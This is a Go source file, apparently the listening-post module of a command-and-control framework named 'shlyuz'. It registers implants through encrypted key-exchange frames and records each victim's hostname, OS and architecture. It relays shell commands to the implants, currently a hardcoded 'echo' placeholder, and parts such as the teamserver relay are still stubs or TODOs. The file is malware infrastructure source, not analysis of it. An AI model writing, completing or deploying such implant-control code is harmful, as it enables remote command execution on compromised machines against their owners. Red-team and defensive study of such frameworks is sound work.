//go:build lp && (!implant || !teamserver)

package transaction

import (
	"encoding/json"
	"errors"
	"log"
	"shlyuz/pkg/component"
	routine "shlyuz/pkg/crypto"
	"shlyuz/pkg/crypto/asymmetric"
	"shlyuz/pkg/instructions"
	"shlyuz/pkg/transport"
)

type initFrameArgs struct {
	manifest component.ComponentManifest
	lpk      asymmetric.PublicKey
}

type implantInitFrameArgs struct {
	Manifest component.ComponentManifest
	Ipk      asymmetric.PublicKey
}

type implantInitAckArgs struct {
	Lpk  asymmetric.PublicKey
	Txid string
}

type reqCmdArgs struct {
	Ipk  asymmetric.PublicKey
	TxId string
}

type RegisteredClient struct {
	InitArgs   implantInitFrameArgs
	CurPubKey  asymmetric.PublicKey
	CurKeyPair asymmetric.AsymmetricKeyPair
	Interface  transport.TransportMethod
	Id         string
}

func decodeInitFrame(initFrame []byte) instructions.InstructionFrame {
	var implantInitInstructionFrame instructions.InstructionFrame
	err := json.Unmarshal(initFrame, &implantInitInstructionFrame)
	if err != nil {
		log.Println("failed to decode received init frame: ", err)
	}
	return implantInitInstructionFrame
}

func decodeInstructionFrame(instructionFrame []byte) instructions.InstructionFrame {
	var implantInstructionFrame instructions.InstructionFrame
	err := json.Unmarshal(instructionFrame, &implantInstructionFrame)
	if err != nil {
		log.Println("faied to decode received instruction frame: ", err)
	}
	return implantInstructionFrame
}

func writeToChannel(channel chan []byte, data []byte) {
	channel <- data
}

func readFromChannel(channel chan []byte) []byte {
	data := <-channel
	return data
}

func readFromTransport(server transport.RegisteredComponent, shlyuzComponent *component.Component) ([]byte, bool, error) {
	data, boolSuccess, err := server.Transport.Recv(server.CmdChannel)
	if !boolSuccess {
		log.Println("failed to receive from channel: ", err)
		return data, false, err
	}
	return data, true, nil
}

func rekey(frame routine.EncryptedFrame) {

}

func RouteClientInstruction(client *transport.RegisteredComponent, instruction instructions.InstructionFrame) {
	var generatedInstruction instructions.InstructionFrame

	switch cmd := instruction.Cmd; cmd {
	case "icmdr":
		// tsCmdReqRelayInstruction = GenerateCmdReqRelayInstruction(&server)
		// RelayCmdRequest(&server, tsCmdReqRelayInstruction) // to the teamserver
		// CmdForwardInstruction = RetrieveCmdReqAck(&server)
		// generatedInstruction = GenerateForwardCmd(client, CmdForwardInstruction)
		generatedInstruction = GenerateForwardCmd(client)
	case "fcmd":
		// tsCmdOutputRelayInstruction = GenerateCmdOutputRelayInstruction(&server, instruction)
		// RelayCmdOutput(&server ,tsCmdOutputRelayInstruction) // to the teamservber
	}

	switch cmd := generatedInstruction.Cmd; cmd {
	case "rcmda":
		RelayForwardCmd(client, generatedInstruction)
	}
}

func GenerateInitFrame(component component.Component) instructions.InstructionFrame {
	var initFrame instructions.Transaction
	var initArgs initFrameArgs

	initFrame.Cmd = "ii"
	initArgs.manifest = component.Manifest
	argMapping := initFrameArgs{manifest: component.Manifest, lpk: component.InitalKeypair.PubKey}
	argMap, _ := json.Marshal(argMapping)
	initFrame.Arg = argMap
	initFrame.ComponentId = component.Config.Id
	instructionFrame := instructions.CreateInstructionFrame(initFrame, true)
	return *instructionFrame
}

func RelayInitFrame(client *transport.RegisteredComponent, initFrame instructions.InstructionFrame) *transport.RegisteredComponent {
	frameMap, _ := json.Marshal(initFrame)
	newKeyPair, _ := asymmetric.GenerateKeypair()
	initFrame.Pk = newKeyPair.PubKey
	transmitFrame, _ := routine.PrepareSealedFrame(frameMap, client.CurPubKey, client.XorKey, client.InitSignature)
	client.CurKeyPair = newKeyPair
	client.CmdChannel = make(chan []byte)
	go writeToChannel(client.CmdChannel, transmitFrame)
	boolSuccess, err := client.Transport.Send(client.CmdChannel)
	if !boolSuccess {
		log.Fatalln("failed to send init: ", err)
	}
	log.Println("Sent init frame.")
	return client
}

func RetrieveInitFrame(client *transport.RegisteredComponent) (instructions.InstructionFrame, transport.RegisteredComponent, bool) {
	var ackInstruction instructions.InstructionFrame
	client.CmdChannel = make(chan []byte)
	data, boolSuccess, err := client.Transport.Recv(client.CmdChannel)
	if !boolSuccess {
		log.Println("failed to receive from channel: ", err)
		return ackInstruction, *client, false
	}
	implantInitFrame := routine.UnwrapSealedFrame(data, client.CurKeyPair.PrivKey, client.CurKeyPair.PubKey, client.XorKey, client.InitSignature)
	if implantInitFrame == nil {
		log.Println("failed to decode initalization frame: ", err)
		return ackInstruction, *client, false
	}
	implantInitInstruction := decodeInitFrame(implantInitFrame)

	client.Manifest.Hostname = implantInitInstruction.Uname.Uname.Nodename
	client.Manifest.Id = implantInitInstruction.ComponentId
	client.Manifest.Os = implantInitInstruction.Uname.Uname.Sysname
	client.Manifest.Arch = implantInitInstruction.Uname.Uname.Machine

	// TODO: Register the txid as an event with the dated timestamp
	// TODO: Check to see if the implant is already registered. Attempt a rekey if so, otherwise ignore host unless considered dead.
	// TODO: Check to see if the implant is using an expected/known ID
	// TODO: This should go to a command router
	// Check if cmd is ii
	if implantInitInstruction.Cmd != "ii" {
		log.Println("[WARNING] invalid initalization frame detected, but with valid keys. Received cmd: ", implantInitInstruction.Cmd)
		log.Println("[WARNING] This should never happen and may indicate an attack. Please contact the devlopers immediately and provide the following:")
		log.Println("[dbginitinstruction]: ", implantInitInstruction)
		log.Println("[dbginitframe]: ", implantInitFrame)
		log.Println("[dbgdata]: ", data)
		return ackInstruction, *client, false
	}

	client.CurPubKey = implantInitInstruction.Pk
	client.Id = implantInitInstruction.ComponentId

	// Prepares ack frame
	var ackTransaction instructions.Transaction
	ackTransaction.Cmd = "ipi"
	ackTransaction.ComponentId = client.SelfComponentId
	ackTransaction.TxId = implantInitInstruction.TxId
	ackInstruction = *instructions.CreateInstructionFrame(ackTransaction, false)
	// client.CurKeyPair, err = asymmetric.GenerateKeypair()
	// if err != nil {
	// 	log.Println("failed to rotate keys: ", err)
	// }
	ackInstruction.Pk = client.CurKeyPair.PubKey
	return ackInstruction, *client, true
}

func RetrieveInstructionRequest(client *transport.RegisteredComponent) (instructions.InstructionFrame, error) {
	var requestInstruction instructions.InstructionFrame
	data, boolSuccess, err := client.Transport.Recv(client.CmdChannel)
	if !boolSuccess {
		log.Println("failed to receive from channel: ", err)
		return requestInstruction, err
	}
	requestData := routine.UnwrapTransmitFrame(data, client.CurPubKey, client.CurKeyPair.PrivKey, client.XorKey)
	if requestData == nil {
		log.Println("failed to decode instruction frame: ", err)
		return requestInstruction, errors.New("invalid instruction frame")
	}
	requestInstruction = decodeInstructionFrame(requestData)

	// TODO: Send Instruction Frame to command router
	client.CurPubKey = requestInstruction.Pk

	return requestInstruction, err
}

func GenerateForwardCmd(client *transport.RegisteredComponent) instructions.InstructionFrame {
	// func GenerateForwardCmdCmd(server transport.RegisteredComponent, inputArgs instructions.Transaction) instructions.Transaction {
	// TODO: This is supposed to make a gcmd and send it to the TS, where we will get back a rcmd. We send back an ack to TS with a rcok, while relaying the command with a rcmda

	// TODO: LOGIC TO DECODE THE INSTRUCTION FROM THE TS GOES HERE

	var outputTransaction instructions.Transaction
	outputTransaction.Cmd = "rcmda"
	outputTransaction.ComponentId = client.SelfComponentId
	// TODO: We would already have a txid from the server here, but since that doesn't exist yet, we'll let CreateInstructionFrame generate one
	// outputTransaction.TxId = receivedTxID
	// outputTransaction.Arg = receivedArgsFromInputTransaction // we already have this
	outputTransaction.Arg = []byte(`{"Cmd": 1, "ComponentId": "` + client.Id + `", "Args": {"Type": "Shell", "Args": "echo ayyyyylmao shlyuz_was_here"}}`)
	forwardCmdInstructionFrame := instructions.CreateInstructionFrame(outputTransaction, false)
	forwardCmdInstructionFrame.Pk = client.CurKeyPair.PubKey
	return *forwardCmdInstructionFrame
}

func RelayForwardCmd(client *transport.RegisteredComponent, forwardCmdInstruction instructions.InstructionFrame) {
	forwardCmdInstruction.Pk = client.CurKeyPair.PubKey
	dataFrame, _ := json.Marshal(forwardCmdInstruction)
	transmitFrame, frameKeyPair := routine.PrepareTransmitFrame(dataFrame, client.CurPubKey, client.CurKeyPair.PrivKey, client.XorKey)
	client.CurKeyPair = frameKeyPair
	go writeToChannel(client.CmdChannel, transmitFrame)
	boolSuccess, err := client.Transport.Send(client.CmdChannel)
	if !boolSuccess {
		log.Println("failed to forward command: ", err)
	}
	log.Println("Relayed command ", forwardCmdInstruction.TxId, "to ", forwardCmdInstruction.ComponentId)
}
